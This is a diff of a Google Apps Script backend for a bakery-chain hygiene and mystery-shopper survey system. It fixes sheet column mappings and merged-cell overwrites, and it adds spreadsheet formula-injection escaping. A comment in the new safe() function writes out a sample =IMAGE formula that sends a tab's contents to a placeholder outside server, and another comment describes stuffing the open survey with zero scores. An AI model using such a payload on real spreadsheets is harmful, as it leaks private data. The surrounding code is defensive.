@@ -60,11 +60,13 @@ const PHOTO_EMBED = true;    // true면 개선요청 표에 사진을 =IMAGE()�
    ⚠로컬 엑셀 사본과 한 칸 어긋나 있었다(사본은 E열). 실제 시트 기준은 D열. */
 const STORE_NAME_COL = 4; // D열
 
-/* 월 블록의 위생(QSC) 점수 열 번호. CS(쇼퍼)는 +2.
-   ⚠아래 값은 로컬 엑셀 사본 기준이라 실제 시트와 다르다 (실물은 7월 위생 = AY열).
-     DASHBOARD_WRITE=false인 동안은 쓰이지 않으므로 그대로 두고,
-     통합시트 자동 기입을 켜기 전에 반드시 실물 열로 다시 매핑할 것. */
-const MONTH_COL = { 1: 6, 2: 13, 3: 20, 4: 29, 5: 36, 6: 43, 7: 52, 8: 59, 9: 66, 10: 75, 11: 82, 12: 89 };
+/* 월 블록의 '위생(QSC) 점수' 열 번호 — 2026-08-15 실물 시트에서 직접 확인.
+   블록 안 오프셋: +0 위생점수 +1 위생등급 +2 CS점수 +3 CS등급 +4 개선(요청 건수) +5 종합점수 +6 종합등급
+   3·6·9·12월 뒤에 분기 평균 2열이 끼어 있어 간격이 7,7,9로 반복된다.
+   ⚠종전 값은 전부 한 칸씩 밀려 있었다(로컬 엑셀 사본 기준이었음) — 매장명 D열 정정과 같은 원인.
+     AY6 = 96%(금종제과 7월 위생)로 검증함. */
+const MONTH_COL = { 1: 5, 2: 12, 3: 19, 4: 28, 5: 35, 6: 42, 7: 51, 8: 58, 9: 65, 10: 74, 11: 81, 12: 88 };
+const YEAR_COL = { score: 97, grade: 98, improve: 99 }; // 연간 평균점수·등급·개선율 (CS·CT·CU열)
 
 function doGet(e) {
   const action = e && e.parameter ? e.parameter.action : '';
@@ -127,19 +129,19 @@ function saveQsc(ss, p) {
   const r = p.result || {};
   let photoN = 0;
   p.items.forEach(function (it) { photoN += (photoMap[it.no] || []).length; });
-  sum.appendRow([p.submittedAt, p.date, p.time || '', p.store, p.inspector,
+  sum.appendRow(safeRow([p.submittedAt, p.date, p.time || '', p.store, p.inspector,
     r.qsc == null ? '' : round1(r.qsc), r.grade || '',
     r.genDeduct || 0, (r.s2 && r.s2.deduct) || 0, (r.s1 && r.s1.deduct) || 0, r.criticalDeduct || 0,
-    p.items.filter(function (it) { return it.value !== null; }).length, photoN]);
+    p.items.filter(function (it) { return it.value !== null; }).length, photoN]));
 
   const det = sheet(ss, 'QSC_상세', ['점검일자', '방문시간', '매장명', '코드', '문항번호', '구분', '문항', '등급구분', '개선필요건수', '상태', '감점', '비고', '사진']);
   const rows = p.items
     .filter(function (it) { return it.value !== null; })
     .map(function (it) {
       const sev = it.severity === 'S1' ? '★★' : it.severity === 'S2' ? '★' : '';
-      return [p.date, p.time || '', p.store, it.code || '', it.no, it.group || '', it.text, sev,
+      return safeRow([p.date, p.time || '', p.store, it.code || '', it.no, it.group || '', it.text, sev,
         String(it.value), it.rating || '', it.deduct == null ? '' : -it.deduct,
-        it.memo || '', (photoMap[it.no] || []).map(function (x) { return x.url; }).join('\n')];
+        it.memo || '', (photoMap[it.no] || []).map(function (x) { return x.url; }).join('\n')]);
     });
   if (rows.length) det.getRange(det.getLastRow() + 1, 1, rows.length, rows[0].length).setValues(rows);
 
@@ -182,15 +184,15 @@ function saveShopper(ss, p) {
   const receipts = saveReceipts(p); // 영수증 사진 → 드라이브, 링크만 시트에
   const sh = sheet(ss, '쇼퍼_응답', ['제출시각', '방문날짜', '방문시간', '매장명', '응대직원설명', '주문내역', '작성자연령대성별', '입력경로', '점수', '응답수', '영수증']
     .concat(p.answers.map(function (a) { return 'Q' + a.no; })));
-  sh.appendRow([p.submittedAt, p.date, p.time || '', p.store, p.staff, p.order, p.demographic,
+  sh.appendRow(safeRow([p.submittedAt, p.date, p.time || '', p.store, p.staff, p.order, p.demographic,
     p.source === 'customer' ? '고객 직접' : '관리자 입력',
     p.result.score == null ? '' : round1(p.result.score), p.result.answered, receipts.join('\n')]
-    .concat(p.answers.map(function (a) { return a.answer || ''; })));
+    .concat(p.answers.map(function (a) { return a.answer || ''; }))));
 
   // 문항별 이유·비고 — 작성된 것만 1행씩 (추적용, 특히 '아니오'의 근거)
   const memoRows = p.answers.filter(function (a) { return a.memo; }).map(function (a) {
-    return [p.submittedAt, p.date, p.time || '', p.store, p.source === 'customer' ? '고객 직접' : '관리자 입력',
-      a.no, a.text, a.answer || '', a.memo];
+    return safeRow([p.submittedAt, p.date, p.time || '', p.store, p.source === 'customer' ? '고객 직접' : '관리자 입력',
+      a.no, a.text, a.answer || '', a.memo]);
   });
   if (memoRows.length) {
     const ms = sheet(ss, '쇼퍼_비고', ['제출시각', '방문날짜', '방문시간', '매장명', '입력경로', '문항번호', '문항', '응답', '비고']);
@@ -222,8 +224,14 @@ function shopperMonthAvg(sh, store, dateStr) {
     const dYm = (d instanceof Date)
       ? d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0')
       : String(d).slice(0, 7);
-    // 열 순서: 0 제출시각 · 1 방문날짜 · 2 방문시간 · 3 매장명 … 8 점수
-    if (String(vals[i][3]).trim() === store.trim() && dYm === ym && typeof vals[i][8] === 'number') {
+    // 열 순서: 0 제출시각 · 1 방문날짜 · 2 방문시간 · 3 매장명 … 7 입력경로 · 8 점수
+    // ⚠'관리자 입력'만 센다. survey.html은 누구나 열 수 있으므로, 이 조건이 없으면
+    //   아무나 특정 매장 이름으로 0점 설문을 여러 건 넣어 그 달 CS 평균을 끌어내릴 수 있다.
+    //   그 평균은 매장 파일 CS 칸과 통합시트로 흘러가고, 10월부터 CS는 종합점수의 30%다.
+    //   (고객 설문은 시트에 그대로 쌓이되 공식 점수 집계에서만 빠진다 — 제출 코드 검증이
+    //    붙기 전까지는 참고 자료로만 본다)
+    if (String(vals[i][3]).trim() === store.trim() && dYm === ym &&
+        String(vals[i][7]).trim() === '관리자 입력' && typeof vals[i][8] === 'number') {
       scores.push(vals[i][8]);
     }
   }
@@ -320,37 +328,50 @@ function writeStoreQsc(p, photoMap) {
   const found = p.items.filter(function (it) { return typeof it.value === 'number' && it.value >= 1; });
   if (!found.length) return { ok: true, tickets: 0 };
 
-  const colB = sh.getRange(1, 2, 60, 1).getValues();
+  const colBRange = grid(sh, 1, 2, 60, 1);
+  const colB = colBRange ? colBRange.getValues() : [];
   let headRow = -1;
   for (let i = 0; i < colB.length; i++) {
     if (String(colB[i][0]).trim().toUpperCase().indexOf('NO') === 0) { headRow = i + 1; break; }
   }
   if (headRow < 0) return { ok: false, error: "개선요청 표 헤더(B열 'NO.')를 못 찾음: " + tab };
 
-  const colJ = sh.getRange(headRow + 1, 10, 200, 1).getValues();
+  const colJRange = grid(sh, headRow + 1, 10, 200, 1);
+  const colJ = colJRange ? colJRange.getValues() : [];
   let used = 0;
   for (let i = 0; i < colJ.length; i++) { if (String(colJ[i][0]).trim() !== '') used = i + 1; }
-  let row = headRow + 1 + used;
+  const row = headRow + 1 + used;
   let no = used;
 
-  const rows = found.map(function (it) {
+  /* 표가 모자라면 예외로 죽는 대신 쓸 수 있는 만큼만 쓴다 —
+     한 회차 지적이 남은 빈 행보다 많을 수 있다(사람이 만든 탭은 행 수가 제각각). */
+  const room = sh.getMaxRows() - row + 1;
+  const list = found.slice(0, Math.max(0, room));
+  if (!list.length) return { ok: false, error: '개선요청 표에 빈 행이 없음: ' + tab };
+
+  const bc = [], d = [], j = [];
+  list.forEach(function (it) {
     no += 1;
     const photos = photoMap[it.no] || [];
-    let photoCell = '';
-    if (photos.length) {
-      photoCell = PHOTO_EMBED
-        ? '=IMAGE("https://drive.google.com/uc?export=view&id=' + photos[0].id + '")'
-        : photos[0].url;
-    }
     const cnt = (typeof it.value === 'number' && it.value > 0) ? ' (' + it.value + '건)' : '';
-    const extraPhotos = photos.length > 1
-      ? ' / 사진 ' + photos.length + '장: ' + photos.map(function (x) { return x.url; }).join(' ') : '';
-    // B=NO, C=구분, D=개선 전 사진, J=개선요청사항, P=비고 (담당부서·담당자·일정 칸은 비워둠)
-    return [no, it.group || '', photoCell, '', '', '', '', '',
-      (it.severity === 'S1' ? '[★★ 중대] ' : it.severity === 'S2' ? '[★ 중대] ' : '') + (it.code ? it.code + ' ' : '') + it.text + cnt, '', '', '', '', '', (it.memo || '') + extraPhotos];
+    const sev = it.severity === 'S1' ? '[★★ 중대] ' : it.severity === 'S2' ? '[★ 중대] ' : '';
+    // 비고와 2번째 이후 사진은 갈 칸이 없다(표가 O열에서 끝남) → 본문 뒤에 붙인다
+    const tail = (it.memo ? '\n· ' + it.memo : '') +
+      (photos.length > 1 ? '\n· 사진 ' + photos.length + '장: ' +
+        photos.map(function (x) { return x.url; }).join(' ') : '');
+    bc.push([no, safe(it.group || '')]);
+    d.push([photos.length ? (PHOTO_EMBED ? imageFormula(photos[0].id) : photos[0].url) : '']);
+    j.push([safe(sev + (it.code ? it.code + ' ' : '') + it.text + cnt + tail)]);
   });
-  sh.getRange(row, 2, rows.length, 15).setValues(rows);
-  return { ok: true, tickets: rows.length, tab: tab };
+
+  /* ⚠B~P를 한 번에 쓰면 안 된다. 데이터 행마다 D:I가 병합돼 있어 E~I 값은 조용히 버려지고,
+     무엇보다 **O열(매장이 올린 개선 후 사진)이 빈 값으로 덮여 지워진다.**
+     예외가 안 나서 알아채지도 못한다. 그래서 본사 몫인 B·C / D / J 만 따로 쓰고
+     매장 몫인 K~O(담당부서·담당자·진행·완료·개선 후 사진)는 절대 건드리지 않는다. */
+  sh.getRange(row, 2, bc.length, 2).setValues(bc);  // B:C
+  sh.getRange(row, 4, d.length, 1).setValues(d);    // D (병합 D:I의 좌상단)
+  sh.getRange(row, 10, j.length, 1).setValues(j);   // J
+  return { ok: true, tickets: list.length, tab: tab, skipped: found.length - list.length };
 }
 
 function writeStoreShopper(store, dateStr, frac) {
@@ -449,6 +470,37 @@ function subFolder(parent, name) {
 }
 
 /* ---------- 공용 ---------- */
+
+/* 수식 주입 차단 — 시트에 쓰는 사용자 입력 문자열은 반드시 이걸 통과시킨다.
+   구글시트는 = + - @ 로 시작하는 문자열을 '수식'으로 저장한다. 그중 =IMAGE()는
+   사람이 아무것도 누르지 않아도 셀이 계산될 때 외부 주소를 자동으로 불러온다.
+   즉 고객 설문 비고칸에 =IMAGE("https://남의서버/?d="&JOIN(",",어느탭!A1:A50)) 한 줄이면
+   시트 내용이 그대로 밖으로 나간다. 앞에 아포스트로피를 붙이면 문자열로 굳고 화면에는 안 보인다.
+   ※ 서버가 의도적으로 만드는 수식은 imageFormula() 하나뿐이며 파일 ID만 받는다. */
+function safe(v) {
+  if (v == null) return '';
+  if (typeof v !== 'string') return v;
+  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
+}
+function safeRow(arr) { return arr.map(safe); }
+
+/* 요청한 크기가 시트 그리드를 넘으면 Apps Script는 잘라주지 않고 예외를 던진다.
+   매장 월 탭은 사람이 만든 것이라 행 수가 제각각이므로, 조용히 짧게 읽는 편이 항상 낫다. */
+function grid(sh, row, col, nRows, nCols) {
+  const r = Math.min(nRows, sh.getMaxRows() - row + 1);
+  const c = Math.min(nCols, sh.getMaxColumns() - col + 1);
+  if (r <= 0 || c <= 0) return null;
+  return sh.getRange(row, col, r, c);
+}
+
+/* 드라이브 사진을 시트·앱에서 보여줄 수 있는 유일한 주소 형식.
+   예전에 쓰던 drive.google.com/uc?export=view 는 구글이 확인 페이지로 바꿔서
+   =IMAGE()에서도 <img>에서도 더 이상 그림이 뜨지 않는다. */
+function photoUrl(fileId) { return 'https://lh3.googleusercontent.com/d/' + fileId + '=w800'; }
+function imageFormula(fileId) {
+  if (!/^[a-zA-Z0-9_-]{20,}$/.test(String(fileId))) return ''; // 서버가 수식을 만드는 유일한 지점
+  return '=IMAGE("' + photoUrl(fileId) + '")';
+}
 
 function sheet(ss, name, headers) {
   let sh = ss.getSheetByName(name);
